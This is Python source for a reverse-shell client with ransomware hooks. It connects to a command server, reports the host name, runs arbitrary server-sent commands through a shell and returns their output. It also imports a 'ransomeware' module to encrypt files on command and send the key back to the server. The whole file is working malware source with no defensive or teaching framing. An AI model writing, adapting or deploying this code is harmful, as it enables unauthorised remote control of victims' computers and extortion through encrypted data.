# Client for the reverse shell
import socket
import subprocess
import os
import sys,locale
import ransomeware
from base64 import b64encode

server = "127.0.0.1"#"192.168.210.140"
BUFFER = 1024*128
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connected = False
shell = True
command = ""
output = ""


def phoneHome():
    global connected,server,s
    while not connected:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((server,80))
            connected = True
            print("Success!")
            s.send(os.getenv("COMPUTERNAME").encode())
        except:
            print("server offline")
    
def rce():
    global shell,command,output,connected
    while shell:
        # receive the command from the server
        try:
            command = s.recv(BUFFER).decode()
            splited_command = command.split()
            print(splited_command)
        except:
            print("network error")
            connected = False
            break
        if len(splited_command) > 0:
            if splited_command[0] == "encrypt":
                key = b64encode(ransomeware.aes_keygen()).decode('utf-8')
                s.send(key.encode())
                ransomeware.encrypt(key,sys.argv[0])
            elif splited_command[0] == "decrypt":
                key = s.recv(1024).decode()
                ransomeware.decrypt(key)

            elif command == "pwd":
                output = os.getcwd()
                output +='\0'
                s.send(output.encode())
            elif command == "exit":
                connected = False
                break
            elif splited_command[0] == "cd":
                try:
                    os.chdir(os.getcwd().join(splited_command[1:]))
                    output = os.getcwd()
                    output +='\0'
                    s.send(output.encode())
                except FileNotFoundError as e:
                    output = str(e)
                    output +='\0'
                    s.send(output.encode())
                    
            else:
                p = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out, err = p.communicate()
                p.stdin.close()
                output = out.decode(encoding=locale.getpreferredencoding(), errors="ignore").strip('\n') if out else err.decode(encoding=locale.getpreferredencoding(), errors="ignore").strip('\n')
                
                #print("output:\n",output)
                output +='\0'
                s.send(output.encode())


while True:
    #print(sys.stdout.encoding,locale.getpreferredencoding())
    phoneHome()
    rce()
    
